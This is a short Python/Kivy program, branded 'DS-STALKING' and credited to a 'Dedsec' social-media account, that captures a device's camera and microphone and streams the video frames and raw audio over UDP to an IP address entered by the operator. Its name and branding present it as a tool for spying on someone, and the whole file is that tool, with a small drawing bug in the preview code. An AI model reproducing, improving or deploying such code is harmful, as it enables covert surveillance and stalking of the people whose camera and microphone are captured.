import cv2
import socket
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.graphics.texture import Texture
from kivy.clock import Clock
import pyaudio
from pyfiglet import Figlet

class CameraApp(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

        # Affichage ASCII
        custom_fig = Figlet(font='slant')
        ascii_art_text = custom_fig.renderText("DS-STALKING")
        info = [
            "BY: 2806",
            "Telegram: t.me/Mr_2806",
            "Tiktok: dedsec_x.0",
            "Youtube: Dedsec assistant"
        ]
        print(ascii_art_text)
        print("\n".join(info))

        # Demande de l'adresse IP à l'utilisateur
        self.host = input("Entrez l'adresse IP de votre téléphone (Termux) : ")
        self.video_port = 5000
        self.audio_port = 5001

        self.capture = cv2.VideoCapture(0)
        Clock.schedule_interval(self.update_frame, 1.0 / 30.0)
        self.video_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.audio_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Configuration audio avec PyAudio
        self.p = pyaudio.PyAudio()
        self.audio_stream = self.p.open(format=pyaudio.paInt16,
                                        channels=1,
                                        rate=44100,
                                        input=True,
                                        frames_per_buffer=1024)

        Clock.schedule_interval(self.stream_audio, 0.05)

    def update_frame(self, dt):
        ret, frame = self.capture.read()
        if ret:
            # Conversion OpenCV à Kivy Texture
            buf = cv2.flip(frame, 0).tobytes()
            texture = Texture.create(size=(frame.shape[1], frame.shape[0]), colorfmt='bgr')
            texture.blit_buffer(buf, colorfmt='bgr', bufferfmt='ubyte')
            self.canvas.clear()
            with self.canvas:
                self.rectangle = texture

            # Envoi du flux vidéo en UDP
            _, buffer = cv2.imencode('.jpg', frame)
            self.video_socket.sendto(buffer.tobytes(), (self.host, self.video_port))

    def stream_audio(self, dt):
        # Capture et envoi de l'audio
        audio_data = self.audio_stream.read(1024)
        self.audio_socket.sendto(audio_data, (self.host, self.audio_port))

    def stop(self):
        self.capture.release()
        self.audio_stream.stop_stream()
        self.audio_stream.close()
        self.video_socket.close()
        self.audio_socket.close()
        self.p.terminate()


class DSStalkingApp(App):
    def build(self):
        return CameraApp()


if __name__ == '__main__':
    DSStalkingApp().run()